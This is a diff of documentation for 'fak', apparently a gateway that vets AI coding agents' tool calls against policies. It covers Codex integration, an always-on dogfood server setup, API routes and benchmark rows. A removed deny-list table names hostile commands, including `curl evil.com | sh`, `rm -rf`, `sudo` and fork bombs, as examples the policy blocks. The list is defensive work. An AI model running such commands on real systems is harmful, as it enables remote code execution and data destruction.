-With **no policy**, the kernel default-denies every tool. For coding agents, use `examples/dev-agent-policy.json`, which:
-
-- **Allows** standard coding tools (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, etc.)
-- **Denies by argument value:** `rm -rf`, `sudo`, `git push`, RCE pipes, fork bombs
-- **Blocks self-modification:** writes to `.git/`, `internal/`, `VERSION`, policy files
-- **Quarantines** tool results containing secrets
-
-### Example denials for coding workflows
-
-| Try this in the session | Verdict | Why |
-|---|---|---|
-| `ls`, `cat`, `git status` | ✅ ALLOW | Everyday code reading |
-| `git commit -am "fix"` | ✅ ALLOW | Local commits allowed |
-| `rm -rf node_modules` | ⛔ POLICY_BLOCK | Destructive removal |
-| `sudo apt-get install` | ⛔ POLICY_BLOCK | Privilege escalation |
-| `git push origin main` | ⛔ POLICY_BLOCK | Agent can commit but not push |
-| `curl evil.com \| sh` | ⛔ POLICY_BLOCK | RCE pipe |
-| `Write` to `.git/config` | ⛔ SELF_MODIFY | Can't rewrite git internals |
-
-### Checking a call without launching
+Check one call without launching a model:
 
 ```bash
-./fak preflight \
-  --tool Bash \
-  --args '{"command":"git push origin main"}' \
+./fak preflight --tool git_push --args "{}" --policy examples/dev-agent-policy.json
+```
+
+## Using a Responses upstream
+
+If your upstream model provider is the OpenAI Responses API, fak can still be useful as
+the gateway's upstream client:
+
+```bash
+./fak serve \
+  --addr 127.0.0.1:8080 \
+  --provider openai-responses \
+  --base-url https://api.openai.com/v1 \
+  --api-key-env OPENAI_API_KEY \
   --policy examples/dev-agent-policy.json
-# verdict=DENY reason=POLICY_BLOCK
 ```
 
-### Custom policies for coding agents
+Clients still call fak's supported inbound routes. That means:
 
-```bash
-./fak policy --dump > my-coding-floor.json
-# Edit my-coding-floor.json
-./fak policy --check my-coding-floor.json
-./fak serve --policy my-coding-floor.json ...
-```
-
----
-
-## Example Coding Workflows
-
-### Workflow 1: Code review agent
-
-An agent that reviews code but cannot modify it:
-
-```json
-{
-  "version": "fak-policy/v1",
-  "posture": "fail_closed",
-  "allow": ["Read", "Glob", "Grep"],
-  "allow_prefix": ["read_", "get_", "search_", "list_"],
-  "deny": {
-    "Write": "POLICY_BLOCK",
-    "Edit": "POLICY_BLOCK",
-    "Bash": "POLICY_BLOCK"
-  },
-  "self_modify_globs": [".git/", ".claude/", "policy.json"]
-}
-```
-
-### Workflow 2: Safe refactoring agent
-
-An agent that can edit files but cannot push to remote or install packages:
-
-```json
-{
-  "version": "fak-policy/v1",
-  "posture": "fail_closed",
-  "allow": ["Read", "Write", "Edit", "Glob", "Grep", "Bash"],
-  "allow_prefix": ["read_", "get_", "search_", "list_"],
-  "deny": {
-    "git_push": "POLICY_BLOCK",
-    "npm_install": "POLICY_BLOCK",
-    "pip_install": "POLICY_BLOCK",
-    "cargo_install": "POLICY_BLOCK"
-  },
-  "self_modify_globs": [".git/", ".claude/", "policy.json", "internal/"]
-}
-```
-
-### Workflow 3: Full-stack dev agent (CI/CD only)
-
-An agent that can do anything except publish to production:
-
-```bash
-./fak serve \
-  --policy examples/dev-agent-policy.json \
-  --addr 127.0.0.1:8080 \
-  --base-url https://api.openai.com/v1 \
-  --api-key-env OPENAI_API_KEY \
-  --model gpt-4-turbo
-```
-
-The `dev-agent-policy.json` allows all dev tools but blocks:
-- `git push` (no direct publishing)
-- `npm publish` (no package publishing)
-- Writes to `.git/`, `internal/kernel/` (no self-modification)
-
----
-
-## Common Patterns for Coding Agents
-
-### Pattern 1: Agent with test sandbox
-
-Give the agent a dedicated sandbox directory:
-
-```bash
-export SANDBOX="/tmp/codex-sandbox-$$"
-mkdir -p "$SANDBOX"
-
-./fak serve \
-  --policy examples/dev-agent-policy.json \
-  --addr 127.0.0.1:8080 \
-  --base-url https://api.openai.com/v1 \
-  --api-key-env OPENAI_API_KEY \
-  --model gpt-4-turbo
-
-# In your prompt, tell the agent:
-# "All work must be done in $SANDBOX. Never write files outside that directory."
-```
-
-### Pattern 2: Read-only exploration
-
-```bash
-./fak serve \
-  --policy examples/research-agent-policy.json \
-  --addr 127.0.0.1:8080 \
-  --model gpt-4-turbo
-```
-
-The `research-agent-policy.json` only allows read operations:
-- ✅ `Read`, `Glob`, `Grep`, `list_files`
-- ❌ `Write`, `Edit`, `Bash`
-
-### Pattern 3: Dry-run DevOps
-
-```bash
-./fak serve \
-  --policy examples/devops-dryrun-policy.json \
-  --addr 127.0.0.1:8080 \
-  --model gpt-4-turbo
-```
-
-The `devops-dryrun-policy.json` allows planning but blocks:
-- `terraform apply` (use `plan` only)
-- `kubectl apply` (use `--dry-run` only)
-- Any `delete` operations
-
-### Pattern 4: Multi-model setup
-
-Route different tasks to different models by running multiple fak instances:
-
-```bash
-# Instance 1: Fast code completion (smaller model)
-./fak serve \
-  --addr 127.0.0.1:8080 \
-  --base-url https://api.openai.com/v1 \
-  --model gpt-3.5-turbo \
-  --policy examples/dev-agent-policy.json &
-
-# Instance 2: Deep code review (larger model)
-./fak serve \
-  --addr 127.0.0.1:8081 \
-  --base-url https://api.openai.com/v1 \
-  --model gpt-4-turbo \
-  --policy examples/research-agent-policy.json &
-```
-
----
-
-## Advanced Usage
-
-### Authentication
-
-For production use, require an API key:
-
-```bash
-./fak serve \
-  --addr 0.0.0.0:8080 \
-  --base-url https://api.openai.com/v1 \
-  --api-key-env OPENAI_API_KEY \
-  --model gpt-4-turbo \
-  --require-key-env FAK_TOKEN
-```
-
-Clients must send `Authorization: Bearer $FAK_TOKEN`.
-
-### Observability
-
-**Prometheus metrics:**
-
-```bash
-curl http://127.0.0.1:8080/metrics
-```
-
-**Key metrics for coding agents:**
-
-```
-fak_gateway_operation_duration_seconds{operation="syscall",verdict="ALLOW"}
-fak_gateway_operation_duration_seconds{operation="syscall",verdict="DENY"}
-fak_vdso_hits_total
-fak_kernel_quarantines_total
-fak_kernel_denies_total
-```
-
-### The `fak` response extension
-
-Every chat completion response includes a `_fak` extension with adjudication details:
-
-```json
-{
-  "id": "chatcmpl-...",
-  "choices": [{
-    "message": {
-      "role": "assistant",
-      "content": null,
-      "tool_calls": [...]
-    }
-  }],
-  "_fak": {
-    "version": "fak/v1",
-    "admissions": [
-      {
-        "tool": "Bash",
-        "verdict": "ALLOW",
-        "by": "monitor",
-        "trace_id": "..."
-      }
-    ]
-  }
-}
-```
-
-### Environment reference
-
-| Variable | Purpose | Default |
-|---|---|---|
-| `OPENAI_BASE_URL` | Points OpenAI SDK at fak | `http://127.0.0.1:8080/v1` |
-| `OPENAI_API_KEY` | Auth for OpenAI upstream | Set for proxy mode |
-| `FAK_ADDR` | fak listen address | `127.0.0.1:8080` |
-| `FAK_POLICY` | Policy manifest path | (none = default-deny) |
-| `FAK_MODEL` | Advertised model id | Set by `--model` |
-
----
-
-## Models That Work
-
-### OpenAI models (via proxy)
-
-| Model | Good for | Notes |
-|---|---|---|
-| `gpt-4-turbo` | General coding, refactoring | Best balance of speed/capability |
-| `gpt-4` | Complex architecture | Slower but more thorough |
-| `gpt-3.5-turbo` | Quick edits, completions | Fast, cost-effective |
-| `o1-preview` | Deep reasoning | New reasoning models (check API support) |
-
-### Local models (OpenAI-compatible)
-
-| Model | Good for | Server |
-|---|---|---|
-| `codellama:7b` | Code completion | Ollama |
-| `codellama:34b` | Complex refactoring | Ollama |
-| `deepseek-coder:6.7b` | Fast edits | Ollama |
-| `qwen2.5-coder:7b` | General coding | Ollama |
-| `Qwen2.5-Coder-32B-Instruct` | Large codebase work | vLLM/llama-server |
-
-### Running with vLLM
-
-```bash
-# Install vLLM
-pip install vllm
-
-# Start vLLM with CodeLlama
-vllm serve codellama/CodeLlama-7b-Instruct-hf \
-  --host 127.0.0.1 \
-  --port 8131 \
-  --tool-call-parser
-
-# Start fak
-./fak serve \
-  --addr 127.0.0.1:8080 \
-  --base-url http://127.0.0.1:8131/v1 \
-  --model codellama/CodeLlama-7b-Instruct-hf
-```
-
----
+- OpenAI-compatible clients call `http://127.0.0.1:8080/v1/chat/completions`.
+- Anthropic-wire clients call `http://127.0.0.1:8080/v1/messages`.
+- Codex CLI/IDE should use the MCP path unless fak grows a client-facing `/v1/responses`
+  route.
 
 ## Troubleshooting
 
 | Symptom | Fix |
 |---|---|
-| `401 Unauthorized` from upstream | Check `OPENAI_API_KEY` is set |
-| All calls denied | Check policy is loaded with `--policy` |
-| Model ignores tools | Use a tool-calling model (GPT-4/3.5, not base completion) |
-| Slow first request | Model is warming up; subsequent requests are faster |
-| `fak: command not found` | Build with `go build -o fak ./cmd/fak` |
-| Port `8080` in use | Use `--addr 127.0.0.1:8090` |
+| Codex cannot see the MCP server | Run `codex mcp --help`, re-add the server, then check `/mcp` in the Codex TUI. |
+| `codex exec --json` has no fak events | The MCP server is not enabled for that Codex run, or the task did not call fak. |
+| OpenAI SDK gets 404 | OpenAI-compatible clients need the `/v1` suffix: `http://127.0.0.1:8080/v1`. |
+| Anthropic SDK gets 404 | Anthropic clients need the origin without `/v1`: `http://127.0.0.1:8080`. |
+| Everything is denied | Load a policy with `--policy`; with no policy the floor fails closed. |
+| You tried to point default Codex model traffic at fak | Use MCP instead, or use a client/framework path that explicitly speaks Chat Completions to fak. |
 
-### Debug mode
+## Source alignment
 
-```bash
-# Enable verbose logging
-./fak serve \
-  --addr 127.0.0.1:8080 \
-  --base-url https://api.openai.com/v1 \
-  --model gpt-4-turbo \
-  --debug
+This page was checked against the current OpenAI Codex manual on 2026-06-25:
 
-# Check the policy that loaded
-./fak policy --dump
-```
+- [Codex overview](https://developers.openai.com/codex/overview)
+- [AGENTS.md guidance](https://developers.openai.com/codex/guides/agents-md)
+- [Codex MCP](https://developers.openai.com/codex/mcp)
+- [Non-interactive `codex exec`](https://developers.openai.com/codex/noninteractive)
+- [Codex configuration](https://developers.openai.com/codex/config-basic)
 
----
+fak-side references:
 
-## Cross-references
-
-- `fak/GETTING-STARTED.md` — fak install and run guide
-- `fak/POLICY.md` — Policy manifest schema and workflow
-- `fak/ARCHITECTURE.md` — fak internal architecture
-- `docs/integrations/claude.md` — Claude Code integration (similar patterns)
-- `examples/README.md` — Policy manifest templates for different agent types
-
----
-
-## Migration from direct OpenAI API
-
-If you're currently calling OpenAI directly and want to add the kernel boundary:
-
-### Before (direct):
-
-```python
-client = openai.OpenAI(api_key="sk-...")
-response = client.chat.completions.create(model="gpt-4", messages=...)
-```
-
-### After (with fak):
-
-```python
-# 1. Point the SDK at fak instead
-client = openai.OpenAI(
-    base_url="http://127.0.0.1:8080/v1",
-    api_key="fak-local"  # fak forwards real key to OpenAI
-)
-
-# 2. Start fak with your OpenAI key
-# (in your terminal/startup script)
-./fak serve \
-  --addr 127.0.0.1:8080 \
-  --base-url https://api.openai.com/v1 \
-  --api-key-env OPENAI_API_KEY \
-  --model gpt-4 \
-  --policy examples/dev-agent-policy.json
-
-# 3. Your code stays the same!
-response = client.chat.completions.create(model="gpt-4", messages=...)
-```
-
-**No code changes needed** — just change the SDK's `base_url` and start `fak serve`. Your existing tools and prompts work unchanged, but now every tool call goes through the kernel's capability floor.
+- [Integration index](README.md)
+- [MCP example](../../examples/mcp/README.md)
+- [Policy manifest guide](../../POLICY.md)
+- [Supported APIs and protocols](../supported/apis-and-protocols.md)
+- [Compatibility matrix](compatibility-matrix.md)
 
 ---
 
@@ -12413,6 +12080,320 @@ errors are covered in [server-troubleshooting.md](server-troubleshooting.md).
 
 ---
 
+# Always-on dogfood server
+
+> Source: `docs/fak/always-on-dogfood-server.md`
+
+---
+title: "Always-On Dogfood Server: 3x the Kernel on the Real Dev Loop"
+description: "How to run the fak kernel in front of the real dev workflow 24/7 — the guarded dispatch fleet plus a shared fak serve gateway — across a laptop, an always-on Mac, and GCP. Setup, measurement, and the kill switch."
+---
+
+# Always-On Dogfood Server
+
+Read this if you operate fak's own agent fleet or want interactive Claude Code
+sessions to cross the same kernel boundary as unattended dispatch workers. You
+will be able to pick the right always-on tier, run the guarded worker loop,
+expose a shared authenticated gateway, measure coverage from audit journals, and
+use the kill switches when the dev loop must bypass dogfood. For the basic server
+setup first, start with [server-quickstart.md](server-quickstart.md); for the
+production knobs this page relies on, see [server-config.md](server-config.md)
+and [observability.md](observability.md).
+
+## 1. Thesis: dogfood the kernel on the REAL dev loop
+
+"Dogfooding" only counts when our own daily dev work crosses the kernel boundary —
+not when a demo does. fak's whole claim is that the kernel (`fak serve` / `fak guard`)
+belongs in front of *every* tool call an agent proposes: deny the dangerous ones by
+structure, repair malformed args, quarantine poisoned results, and write every verdict
+to a durable, tamper-evident record. The honest test of that claim is to put it in
+front of the highest-volume agent work we actually run — the dispatch fleet and our
+own Claude Code sessions — and leave it there.
+
+The highest-volume dev work on a fleet node is a dispatch worker: a full agentic
+`claude -p` session that runs unattended. Until recently every one of those workers
+talked **straight to the provider API** — the kernel adjudicated **none** of it. That
+is the inverse of dogfooding.
+
+A just-shipped change closes that gap. `tools/dispatch_worker.py` now fronts every
+worker with `fak guard` **by default** (`guarded_launch_command`, gated by
+`FLEET_DOGFOOD_GUARD`), and `tools/issue_dispatch.py` routes its detached spawn through
+the same path. So:
+
+| | Fleet workers through the kernel |
+|---|---|
+| **Before** | 0% — workers called the provider API directly |
+| **After** | 100% of claude workers, **default-on**, fail-open when `fak` is not built |
+
+That is the **first** of the three multipliers. The other two are *time* (run the
+guarded loop 24/7, not only when a laptop happens to be awake) and *surface* (put a
+shared `fak serve` gateway in front of hand-driven Claude Code sessions too, so even
+interactive coding is kernel-adjudicated). This doc is how you get all three.
+
+The interactive front door is the one-command, productized form of the same boundary
+(`cmd/fak/guard.go`): `fak guard -- claude` starts the same gateway `fak serve` runs,
+points the child agent's base URL at it through a **child-only** env var (never your
+shell, never `settings.json`), defaults the upstream to the real Anthropic API in
+passthrough mode, uses your Claude Pro/Max **subscription** OAuth token by default when
+no `ANTHROPIC_API_KEY` is set, and turns a **durable, hash-chained decision journal on
+by default** that you can replay with `fak audit verify`.
+
+```
+ ┌─────────────┐  POST /v1/messages  ┌────────────────────────┐  /v1/messages  ┌──────────────────┐
+ │ claude (-p) │ ─────────────────▶  │  fak guard / fak serve  │ ─────────────▶ │ api.anthropic.com │
+ │  the worker │ ◀──── SSE stream ─  │  adjudicates every tool │ ◀──────────── │   (real Claude)   │
+ └─────────────┘                      └────────────────────────┘                └──────────────────┘
+   ANTHROPIC_BASE_URL set on the CHILD only      every tool call crosses the floor; every verdict journaled
+```
+
+---
+
+## 2. The three always-on tiers
+
+You can dogfood at three levels of "always-on". Each tier is additive — Tier 1 and
+Tier 2 just keep the same guarded loop running longer and reach more sessions.
+
+| | Tier 0 — Laptop (Windows) | Tier 1 — Always-on Mac | Tier 2 — GCP always-on |
+|---|---|---|---|
+| **What runs** | scheduled-task fleet | guarded fleet 24/7 + shared `fak serve` gateway | guarded fleet 24/7 + shared `fak serve` gateway |
+| **Uptime** | intermittent (whenever the laptop is on) | 24/7 (launchd `KeepAlive` + `caffeinate`) | 24/7 (VM never sleeps) |
+| **Cost** | $0 | $0 (hardware you own) | ~ a few $/month for an `e2-small`; GPU only on burst |
+| **Local-model in-kernel path** | CPU-slow (proof only) | CPU/Metal | burst to a GPU VM (see `tools/gcp_accel.py`) |
+| **Reachable by other machines** | no | yes, over Tailscale | yes, over Tailscale / private IP |
+| **Role** | the status quo | the recommended dev server | overflow + GPU bursts |
+
+The kernel boundary is **identical** on every tier — it is the same `fak guard` /
+`fak serve` gateway. The tiers differ only in *how long it stays up* and *who can reach
+it*.
+
+### Tier 0 — Laptop (Windows): the status quo
+
+The fleet already runs on the laptop on a Windows Scheduled Task that ticks a watchdog
+every 5 minutes; the watchdog respawns the `dos loop --enact` dispatch supervisor when
+one is not alive, and each spawned worker is now guarded by default. This is real
+dogfooding, but only while the laptop is awake and the task is enabled — so coverage is
+*intermittent*.
+
+Nothing new is required here; the guarded path is on by default. Confirm it:
+
+```powershell
+# Build the in-tree fak binary the guard path resolves (tools/.bin/fak.exe)
+.\scripts\dogfood-claude.ps1 --install
+
+# See exactly what one worker would launch — note `fak ... guard ... -- claude`
+python tools\dispatch_worker.py --lane demo --dry-run
+
+# Plan one safe, switcher-routed, bounded dispatch tick (dry-run)
+python tools\issue_dispatch.py
+```
+
+### Tier 1 — Always-on Mac (M-series mini): the recommended dev server
+
+A small Apple-silicon Mac that stays on is the best always-on dogfood host: it is quiet,
+cheap to run, and Metal makes even the local-model in-kernel path usable. It does two
+jobs.
+
+**Job A — run the guarded fleet 24/7.** There is already a launchd template and a cron
+installer for the dispatch supervisor watchdog; today they run only the **watchdog**
+(which keeps `dos loop --enact` alive), not a `fak serve` gateway. Arm the watchdog so
+the guarded fleet runs around the clock:
+
+```bash
+# Cron path (simplest): arms tools/fleet_dos_dispatch_watchdog.py every 5 min
+FAK_DISPATCH_ENABLE=1 ./tools/register_mac_watchers.sh
+
+# Or the launchd path (KeepAlive, survives logout): fill the template's
+# __PLACEHOLDER__ tokens and load it as a per-user agent
+sed -e "s#__PYTHON__#$(command -v python3)#" \
+    -e "s#__REPO__#$(cd "$(dirname tools)" && pwd)#" \
+    tools/com.fleet.dispatch-supervisor.plist \
+  > ~/Library/LaunchAgents/com.fleet.dispatch-supervisor.plist
+launchctl load -w ~/Library/LaunchAgents/com.fleet.dispatch-supervisor.plist
+```
+
+Build the in-tree `fak` binary once so the guard path resolves it (it fails open to an
+unguarded worker if no `fak` is found, so this is what turns coverage on):
+
+```bash
+./scripts/dogfood-claude.sh --install     # builds tools/.bin/fak, installs PATH launchers
+```
+
+**Stay awake.** A Mac sleeps, and a sleeping Mac dogfoods nothing. The node `node-macos-a`
+already exists but **flaps offline roughly every 25 minutes** — it goes to sleep between
+jobs. The fix is `caffeinate` plus launchd `KeepAlive`. Run the supervisor under
+`caffeinate` so the machine cannot idle-sleep while the loop is up:
+
+```bash
+# Keep the host awake for as long as the dispatch loop runs
+caffeinate -dimsu dos loop --enact --workspace "$PWD" --target 4 --interval 120
+```
+
+`-dimsu` blocks display, idle, disk, and system sleep and asserts a user-active state.
+Pair it with launchd `KeepAlive` (set `<key>KeepAlive</key><true/>` in the agent plist)
+so the job restarts if it ever exits. Together: launchd keeps the process alive, and
+`caffeinate` keeps the *machine* alive while it runs — no more 25-minute flap.
+
+**Job B — host a shared `fak serve` gateway for hand-driven sessions.** The fleet covers
+*unattended* workers. To cover *interactive* Claude Code too — yours and anyone else on
+the network — run one shared gateway on the Mac that other machines point
+`ANTHROPIC_BASE_URL` at. Then a normal `claude` on a laptop is kernel-adjudicated without
+running its own gateway.
+
+```bash
+# On the Mac: a shared, authenticated gateway in front of the real Anthropic API.
+# Bind beyond loopback ONLY with a required key — an unauthenticated off-host kernel
+# gateway is an open door (fak guard and fak serve both warn about this).
+export FAK_GATEWAY_KEY="$(openssl rand -hex 32)"
+export ANTHROPIC_API_KEY="sk-ant-..."        # or use the subscription-OAuth default
+fak serve --addr 0.0.0.0:8080 \
+  --provider anthropic --base-url https://api.anthropic.com \
+  --policy examples/dogfood-claude-policy.json \
+  --require-key-env FAK_GATEWAY_KEY
+```
+
+Reach it over **Tailscale** (the Mac and your laptop on one tailnet — no public exposure).
+On any other machine:
+
+```bash
+export ANTHROPIC_BASE_URL="http://<mac-tailscale-ip>:8080"
+export ANTHROPIC_API_KEY="$FAK_GATEWAY_KEY"   # the gateway's bearer; auth is over Tailscale
+claude                                          # your normal Claude Code, now kernel-adjudicated
+```
+
+For a *single* laptop session you do not need the shared gateway at all —
+`fak guard -- claude` runs its own in-process gateway on a private loopback port and
+needs no key. The shared gateway is the lever for covering *many* machines / sessions
+from one always-on host.
+
+### Tier 2 — GCP always-on: overflow + GPU burst
+
+When the Mac is busy or you want a second always-on lane, a small GCP VM runs the same
+two jobs. Use a cheap, always-on instance for the steady state, and **burst** to a GPU
+VM only when you want to exercise fak's own in-kernel decode (`fak serve --gguf`, the
+pure-Go forward) under real Claude Code load.
+
+**Steady state — a tiny always-on VM.** An `e2-small` is enough to run the guarded
+fleet and a shared `fak serve` anthropic-passthrough gateway (the gateway does no model
+compute itself — the upstream does). Install the in-tree binary, arm the same watchdog
+cron, and run the same shared gateway as Tier 1 Job B. Reach it over Tailscale or the
+VPC's private IP; never bind `0.0.0.0` without `--require-key-env`.
+
+**Burst — a GPU VM for the local-model in-kernel path.** The CPU-only in-kernel forward
+is too slow for a full interactive Claude Code turn (a real turn sends ~5–6K tokens of
+system prompt and tool schemas; see the honest caveat in `DOGFOOD-CLAUDE.md`). For that
+path you want a GPU. `tools/gcp_accel.py` is the registry of GCP accelerator machine
+types fak can run on — a Blackwell-first fallback ladder (`a4-b200` → `a4x-gb200` →
+`a3-ultra-h200` → `a3-high-h100` → `g2-l4` → `n1-t4`) with the cheapest tier
+(`n1-t4`, ~$0.55/hr) reserved for de-risking the plumbing before spending on a big node.
+
+```bash
+# Inspect the accelerator ladder (pure data; no gcloud / network call)
+python tools/gcp_accel.py
+```
+
+Provision the cheapest tier first to prove the loop end-to-end, then burst up. Run
+`fak serve --gguf <weights>` on the GPU node and point the guarded fleet (or a Tier-1
+gateway) at it; tear the GPU VM down when the burst is done so it is not always-on cost.
+
+---
+
+## 3. How to measure the 3x
+
+You measure dogfooding with two things: a **coverage scorecard** and the **audit
+journals** the guarded workers leave behind. Configuration is not evidence — a flag can
+say "on" while nothing ran — so both checks cross-check reality on the live host.
+
+**The scorecard.** `tools/dogfood_coverage.py` imports `dispatch_worker` and calls the
+live `guarded_launch_command` on *this* host, so the score reflects what would actually
+launch — not what a config claims. It folds its KPIs into one `coverage` percent, a
+`dogfood_debt` integer (count of unmet HARD affordances), an A–F grade, and a
+control-pane JSON payload.
+
+```bash
+python tools/dogfood_coverage.py            # human report
+python tools/dogfood_coverage.py --json      # control-pane payload
+python tools/dogfood_coverage.py --check     # exit 1 if any HARD KPI is unmet
+```
+
+The HARD KPIs are the ones that must hold for the fleet to be kernel-adjudicated at
+all:
+
+- `fleet_leaf_guarded` — the leaf launcher really fronts a claude worker with `fak guard`
+  on this host (a behavior check, not a grep).
+- `fak_bin_resolvable` — a `fak` binary resolves, so the fail-open path is not silently
+  dropping coverage to 0%.
+- `guard_default_on` — `FLEET_DOGFOOD_GUARD` is not disabled in the live environment.
+- `issue_dispatch_wired` — the scheduled-task lane routes its spawn through the guard path.
+- `guard_verb_present` — `fak guard` exists as the one-command front door.
+
+**The journals are the witness.** Every guarded worker writes its verdicts to a durable,
+hash-chained JSONL journal. The fleet uses a **per-session** journal under the gitignored
+`.dispatch-runs/guard-audit/`, named `<lane>-<backend>-<pid>-<id>.jsonl` — keyed on the
+lane and backend (for separability and globbing) **plus a per-process token**. That
+per-session key is deliberate: the hash-chained journal has no inter-process lock, so two
+concurrent same-lane workers sharing one file would braid two independent chains into a
+forked, unverifiable journal. A per-session file lets each `fak guard` own its own valid
+chain; the interactive `fak guard` default writes one under your user config dir.
+`dogfood_coverage.py` counts the decision rows across those journals (`audit_rows` in the
+payload) — that is the proof the wire was *exercised*, not merely wired. Verify any one
+chain is intact (glob the lane prefix to find them):
+
+```bash
+fak audit verify .dispatch-runs/guard-audit/<lane>-claude-<pid>-<id>.jsonl
+```
+
+Run `dogfood_coverage.py` on a `/loop` cadence to keep the number from rotting; watch
+`audit_rows` climb as the always-on fleet works, and watch `coverage` hit and hold A.
+
+---
+
+## 4. The kill switch and safety
+
+Dogfood-by-default never means dogfood-no-matter-what. There are three release valves,
+all already in the code.
+
+**Kill switch — `FLEET_DOGFOOD_GUARD=0`.** Set this on a node and its workers launch
+**unguarded** (straight to the provider), no code change, no `dos.toml` edit. Any of
+`{0, off, false, no, disable, disabled}` (and empty) turns it off; unset means on.
+
+```bash
+FLEET_DOGFOOD_GUARD=0 python tools/issue_dispatch.py --live   # this node: workers unguarded
+```
+
+**Fail-open when `fak` is not built.** `resolve_fak_bin` looks for `$FAK_BIN`, then the
+in-tree `tools/.bin/fak[.exe]` the dogfood launcher builds, then `fak` on PATH. If none
+resolves it returns nothing and the worker launches **unwrapped** rather than failing.
+A host that has never built `fak` still dispatches — it just dogfoods 0% until you build
+the binary (which is exactly what `dogfood_coverage.py`'s `fak_bin_resolvable` KPI flags).
+The fleet must keep moving; coverage is a goal, never a gate on getting work done.
+
+**Timeout floors so the gateway never truncates a long turn.** `fak guard` fronts the
+real provider in passthrough, and a frontier Claude Code turn with extended thinking can
+run well past `fak serve`'s default 60 s planner / 90 s write timeouts — which would cut
+the turn off at the gateway. So a guarded worker raises both floors to a generous
+600 s (`GUARD_TIMEOUT_FLOOR_S`) via `FAK_PLANNER_TIMEOUT_S` / `FAK_HTTP_WRITE_TIMEOUT_S`,
+**without** clobbering an explicit operator value. A spawned worker is also wall-clock
+bounded (default 1800 s, opt out with `--timeout-s 0`) so a wedged session cannot burn
+tokens forever.
+
+One more safety note for the shared-gateway tiers: a gateway bound beyond loopback with
+no required key is an unauthenticated kernel reachable off-host. Both `fak guard` and
+`fak serve` warn loudly about this. On Tier 1 / Tier 2 always pair a non-loopback
+`--addr` with `--require-key-env`, and keep the gateway on a private network (Tailscale
+or the VPC), never the public internet.
+
+---
+
+## See also
+
+- [`DOGFOOD-CLAUDE.md`](../../DOGFOOD-CLAUDE.md) — the one-command dogfood launcher and the `/v1/messages` adjudication proxy
+- [`docs/fak/server-quickstart.md`](server-quickstart.md) — every way to start a `fak serve` gateway (auth, policy, in-kernel, cloud)
+- `cmd/fak/guard.go` — the `fak guard` front door (child-only base URL, subscription default, default-on hash-chained journal)
+- `tools/dogfood_coverage.py` — the coverage scorecard (run it to measure the 3x)
+- `tools/gcp_accel.py` — the GCP accelerator ladder for the GPU-burst in-kernel path
+
+---
+
 # What fak supports (hub)
 
 > Source: `docs/supported/README.md`
@@ -13052,6 +13033,9 @@ The principal served routes, from the Claude Code integration guide and the
 | `POST /v1/fak/syscall` | Adjudicate and execute one tool call (dispatch to the registered engine) |
 | `POST /v1/fak/adjudicate` | Get a pre-execution verdict without executing |
 | `POST /v1/fak/admit` | Send a client-executed tool result through the result-side floor |
+| `GET /v1/fak/session/{id}` | Read one served session's live drive state (status/budget/pace/priority) |
+| `POST /v1/fak/session/{id}/{verb}` | Control a session in flight — `stop` · `pause` · `resume` · `throttle` · `run` · `budget` · `pace` · `priority` (optional `if_rev` optimistic-concurrency guard) |
+| `GET /v1/fak/sessions` | Multi-session snapshot of all live drive states |
 | `GET·POST /v1/fak/changes` | Drain the cross-agent "what changed" feed (vDSO coherence) |
 | `GET·POST /v1/fak/events` | Drain the durable decision-journal tail (after a `?since=` cursor) |
 | `POST /v1/fak/revoke` | Refute a poisoned or stale world-state witness fleet-wide |
@@ -18090,6 +18074,7 @@ Every number on this page obeys the same rules, enforced in CI and in the per-de
 | **Syscall boundary tax (M3 Pro, refreshed)** | **~2,849×** in-process vs spawned `fak hook` | in-process adjudication | process-per-decide baseline (n=100) | `bcad56e` | `report.json` + `experiments/mac-m3pro-kernel-20260620/report.json` |
 | **Causal invalidation-on-external-write** | **PASS · max\|Δ\|=0** (1 evicted, sibling warm, re-admit refused) | vDSO `Revoke` + cachemeta external-invalidation | blunt world-flush / stale serve | `0fc39aa` | `experiments/causal-invalidation-20260620/causalbench-witness-20260620.json` |
 | **Ultra-long-context work floor (>100k tokens, EXACT/contention-free)** | **single ~10× · 5-agent fleet ~40×+ vs naive (4.3× vs tuned)** | Qwen2.5-7B geometry, P=100k T=10 C=1/5 D=200 R=500 (arithmetic, no model) | Naive re-prefill (A/C ref) / warm per-agent KV (B/C) | _this commit_ | `session/ultra-long-context-floor-20260622.json` + `ULTRA-LONG-CONTEXT-RESULTS.md`. WORK floor (token = sessionbench `prefillTokens`; FLOP = O(L²)-aware), not a wall-clock; anchor token A/C 62.0× reproduces the committed 50×5 token floor; live wall-clock anchor at >100k is separately gated |
+| **README front-page webbench hero — WebVoyager fleet prefill (MODELED geometry, no model)** | **8-worker A/C 9.7× vs naive floor · B/C 1.10× vs tuned per-agent KV · A/B turn-tax 8.8× (worker-independent)** | WebVoyager 643-task set, turns derived per-task from difficulty (`geometry_sources: difficulty=643`), BasePrefix=3000 / Action=150 / DOMState=2000 | A: naive re-prefill-every-turn (A/C) · B: tuned per-agent KV (B/C) | _this commit_ | `experiments/webbench/webvoyager-geometry-20260625.json` (emit with `fak webbench describe --dataset testdata/webbench/webvoyager-converted.jsonl --workers 1,2,4,8 --out …`). PREFILL-TOKEN WORK FLOOR from a deterministic geometry model — closed-form integer formula in `internal/webbench/geometry.go::ComputeArms`, **no model, no wall-clock, not "measured"**. README leads with the B/C value-stack number (1.10×); the 9.7× is explicitly the vs-naive-floor figure |
 
 | **Decode vs prefill worker-count scaling (x86_64 32-core, within-run ratio)** | **decode all-cores-default penalty 2.5× (1.5B) → 2.1× (3B) → 1.14× (7B); decode peaks ≤8–16w, prefill scales to all cores** | Qwen2.5-1.5B/3B/7B Q8, x86_64 32-core agent-host (contended) | best worker count vs 32w default — same box, same run | _this commit_ | `experiments/session/worker-scaling-desktop-x86-20260624.json` + `WORKER-SCALING-DESKTOP-X86-20260624.md`. WITHIN-RUN ratio only; absolute tok/s is contended agent-host, NOT comparable to the uncontended M3 Pro rows. CPU-threading analogue of the GPU launch-bound small-model artifact |
 | **Self-ablation feature sweep — vDSO on/off (deterministic, Regime A of epic #607)** | **vdso_hits 0→7 · engine_calls 12→5 · tokens 937→417 (−520)** | tau2-airline-smoke frozen trace (12 calls), mock engine, no model | all-off baseline (vDSO off) | _this commit_ | `experiments/ablate/tau2-smoke-vdso-ablation.json` + `ABLATE-RESULTS.md`. Counter fields (workload_hash/vdso_hits/engine_calls/tokens/denies/quarantines) reproduce byte-identical (kernel event counters on a frozen trace); only p50_ns/wall_seconds/buckets are single-box. Rung 1 sweeps the one runtime knob only; env-gated features + cross-agent (Regime B) arms are separate rungs |
